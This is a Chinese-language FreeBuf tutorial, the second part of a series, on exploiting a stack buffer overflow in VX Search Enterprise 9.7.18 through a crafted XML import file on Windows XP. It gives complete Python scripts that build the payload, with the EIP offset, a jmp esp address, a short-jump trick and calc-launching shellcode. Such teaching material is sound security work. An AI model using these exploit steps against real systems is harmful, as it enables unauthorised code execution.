***本文原创作者：zusheng，本文属FreeBuf原创奖励计划，未经许可禁止转载**  

## 0x01 前言

 **漏洞-信息安全界最常见的词汇，在百度百科是这样描述的。**

 **漏洞是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统。**

![p1.jpg](https://image.3001.net/images/20180409/1523262110117.jpg!small)  

本文主要介绍的是Windows软件漏洞的利用开发教程。

我花了大量的时间来研究了计算机安全领域Windows漏洞利用开发，希望能和大家分享一下，能帮助到对这方面感兴趣的朋友，如有不足，还请见谅。

## 0x02 准备阶段

欢迎阅读本系列文章的第二部分，如果你错过了第一部分，请点击下方传送门。

<http://www.freebuf.com/articles/system/166500.html>

本部分我们将介绍如何使用short jump来解决在堆栈上中断的shellcode。

我们需要准备以下工具：

    
    
    1、Windows XP SP3 32-bit系统iso镜像
    
    2、Immunity Debugger-漏洞分析专用调试器
    
    3、代码文本编辑器（个人喜好，我用的是notepad++）
    
    4、VX Search Enterprise 9.7.18

VX Search是一款能够快速搜索电脑文件的工具软件，我们的目标是VX Search
Enterprise版本9.7.18，你可以通过下面链接下载存在漏洞的程序。

    
    
    https://www.exploit-db.com/apps/746ec728a4cf975be799c7f509db383e-vxsearchent_setup_v9.7.18.exe
    

软件下载安装

![15232621177597.png!small](https://image.3001.net/images/20180409/15232621177597.png!small)

## 0x03 漏洞分析

漏洞地址：

<https://www.exploit-db.com/exploits/42181/>

通过分析我们知道漏洞存在导入XML文档功能中。XML文档classify标签的name属性导致了堆栈缓冲区溢出。

![1523262123785.png!small](https://image.3001.net/images/20180409/1523262123785.png!small)

### 构造XML

我们知道漏洞发生的地点，现在我们就要通过构造一个XML文档来促使程序发生崩溃。

    
    
    # -*- coding: UTF-8 -*-    
    juck = "A" * 2000 #测试字符串
    
    xmlpayload = '<?xml version="1.0" encoding="UTF-8"?>\n<classify\nname=\'' + juck + '\n</classify>'
    xmlfp = open("payload.xml","w")    #生成测试Payload文档
    xmlfp.write(xmlpayload)
    xmlfp.close()
    

通过Import Command选项导入payload.xml文件，程序发生崩溃。

![15232621296519.png!small](https://image.3001.net/images/20180409/15232621296519.png!small)

### 崩溃分析

现在我们打开Immunity Debugger，然后File-Open打开vxsrchc.exe

![15232621341922.png!small](https://image.3001.net/images/20180409/15232621341922.png!small)

点击Run program或者按F9让程序运行。

![15232621403766.png!small](https://image.3001.net/images/20180409/15232621403766.png!small)

通过Import Command选项导入payload.xml文件，程序发生崩溃。

![15232621458252.png!small](https://image.3001.net/images/20180409/15232621458252.png!small)

EIP成功被覆盖，第一部分介绍很详细了，这里不再过多介绍。

## 0x04 漏洞利用开发

现在我们想要利用这个控制并执行我们自己的控制代码。

### 寻找EIP offset

这里我们使用Immunity Debugger的插件mona，这样我们就避免了平常复杂的寻找方法。

安装mona：

<https://github.com/corelan/mona>

将mona.py放在Immunity Debugger安装目录PyCommands下就行了。

第一步：设置mona文本日志所在的文件夹

    
    
    !mona config -set workingfolder c:\logs\%p
    15221322664340.png!small
    

第二步：生成2000个测试字符

    
    
    !mona pattern_create 1100
    

将测试字符复制到juck变量中，运行脚本生成payload.xml

![1523262153352.png!small](https://image.3001.net/images/20180409/1523262153352.png!small)

通过Import Command选项导入payload.xml文件，程序发生崩溃。

可以发现EIP地址现在是0×42327A42

第三步:确定偏移量

    
    
    !mona pattern_offset 0x42327A42
    

![15232621584190.png!small](https://image.3001.net/images/20180409/15232621584190.png!small)

我们找到了偏移量1536

### 验证偏移量

我们现在来验证一下偏移量是否正确。

    
    
    # -*- coding: UTF-8 -*-    import struct
    
    juck = "\x41"*1536    #偏移
    eip = struct.pack("<L", 0x42434445)    #覆盖EIP为0x42434445
    payload = juck + eip #组合payload
    end = "\x43"*(2000 - len(payload)) #填补剩余的空间确保溢出
    xmlpayload = '<?xml version="1.0" encoding="UTF-8"?>\n<classify\nname=\'' + payload + end + '\n</classify>'
    xmlfp = open("payload.xml","w")    #生成测试文件payload.xml
    xmlfp.write(xmlpayload)
    xmlfp.close()
    

生成文件后重复之前步骤，发现EIP被精准覆盖。

![15232621687525.png!small](https://image.3001.net/images/20180409/15232621687525.png!small)

### 寻找合适的地址覆盖EIP

第一部分有介绍，这里我们就直接操作了，运行下列指令我们将得到一个jmp.txt

    
    
    !mona jmp -r esp
    

![15232621754582.png!small](https://image.3001.net/images/20180409/15232621754582.png!small)

然后我们就得到一个地址0x7c8369f0，这个就是我们需要的EIP地址。

### 开发测试

现在shellcode我们先添加中断代码来测试一下。

    
    
    # -*- coding: UTF-8 -*-    import struct
    
    juck = "\x41"*1536                    #偏移
    eip = struct.pack("<L", 0x7c8369f0)    #覆盖EIP为0x42434445
    nops = "\x90" * 24                  #24字节的NOP
    shellcode = "\xCC" * 250             #shellcode
    payload = juck + eip + nops + shellcode                 #组合payload
    end = "\x43"*(2000 - len(payload))     #填补剩余的空间确保溢出
    xmlpayload = '<?xml version="1.0" encoding="UTF-8"?>\n<classify\nname=\'' + payload + end + '\n</classify>'
    xmlfp = open("payload.xml","w")        #生成测试文件payload.xml
    xmlfp.write(xmlpayload)
    xmlfp.close()
    

运行脚本生成payload.xml，我们继续F9运行程序，通过Import Command选项导入payload.xml文件，程序发生崩溃。

![15232621826745.png!small](https://image.3001.net/images/20180409/15232621826745.png!small)

重点来了，我们成功执行了我们的INT指令，但是看我们的shellcode在0x00112870和0x00112872处中断了，不用担心，这正好是我们学习使用short
jump的机会。

### 利用JMP解决中断的shellcode

首先，我们要了解一些基本知识，我们的目标是跳过堆栈那一部分中断的shellcode。

在汇编中，指令JMP 10将导致指令指针IP跳过16个字节，JMP采用十六进制参数。

JMP指令参数范围是00h到7Fh，换句话说，JMP指令最大跳转为127个字节。

我们在使用雪橇跳板滑雪，在落地的时候需要一个缓冲地带来让我们平稳的落地，相同道理，在使用JMP指令跳转后我们需要放入NOP，我们希望JMP降落在NOP代码中间。

首先我们要将JMP 10翻译成目标代码（十六进制码），通过Mona命令

    
    
    !mona assemble -s “jmp 10”
    

![15232621885200.png!small](https://image.3001.net/images/20180409/15232621885200.png!small)

我们得到了

    
    
    \xeb\x10
    

我们修改脚本

    
    
    # -*- coding: UTF-8 -*-    import struct
    
    juck = "\x41"*1536                    #偏移
    eip = struct.pack("<L", 0x7c8369f0)    #覆盖EIP为0x42434445
    nops = "\x90" * 24                  #24字节的NOP
    shortjump = "\xeb\x10"                 #short jump
    nops1 = "\x90" * 20                    #20字节的NOP
    shellcode = "\xCC" * 250             #shellcode
    payload = juck + eip + nops + shortjump + nops1 + shellcode #组合payload
    end = "\x43"*(2000 - len(payload))     #填补剩余的空间确保溢出
    xmlpayload = '<?xml version="1.0" encoding="UTF-8"?>\n<classify\nname=\'' + payload + end + '\n</classify>'
    xmlfp = open("payload.xml","w")        #生成测试文件payload.xml
    xmlfp.write(xmlpayload)
    xmlfp.close()
    

运行脚本生成payload.xml，我们继续F9运行程序，通过Import Command选项导入payload.xml文件，程序发生崩溃。

![15232621941061.png!small](https://image.3001.net/images/20180409/15232621941061.png!small)

非常好，我们成功跳过堆栈那一部分中断的shellcode，并且安稳的在NOP区着陆。

### 成品测试

经过上面的分析，我们的脚本修改如下：

    
    
    # -*- coding: UTF-8 -*-    import struct
    
    juck = "\x41"*1536                    #偏移
    eip = struct.pack("<L", 0x7c8369f0)    #覆盖EIP为0x42434445
    nops = "\x90" * 24                  #24字节的NOP
    shortjump = "\xeb\x10"                 #short jump
    nops1 = "\x90" * 20                    #20字节的NOP
    shellcode = "\x31\xC9"                    # xor ecx,ecx
    shellcode += "\x51"                        # push ecx
    shellcode += "\x68\x63\x61\x6C\x63"     # push 0x636c6163
    shellcode += "\x54"                        # push dword ptr esp
    shellcode += "\xB8\xAD\x23\x86\x7C"        # mov eax,0x7c8623AD
    shellcode += "\xFF\xD0"                  # call eax
    payload = juck + eip + nops + shortjump + nops1 + shellcode #组合payload
    end = "\x43"*(2000 - len(payload))     #填补剩余的空间确保溢出
    xmlpayload = '<?xml version="1.0" encoding="UTF-8"?>\n<classify\nname=\'' + payload + end + '\n</classify>'
    xmlfp = open("payload.xml","w")        #生成测试文件payload.xml
    xmlfp.write(xmlpayload)
    xmlfp.close()
    

shellcode的介绍请大家阅读第一部分文章。

运行脚本生成payload.xml，我们继续F9运行程序，通过Import Command选项导入payload.xml文件，程序发生崩溃并弹出计算器。

![15232622012001.png!small](https://image.3001.net/images/20180409/15232622012001.png!small)

## 0x05 总结

我们第二部分总体是在第一部分的基础上，介绍了如何使用short
jump来解决shellcode在堆栈上中断的问题，本人水平有限，如有不足，还请各位兄弟指出。

 ***本文原创作者：zusheng，本文属FreeBuf原创奖励计划，未经许可禁止转载**

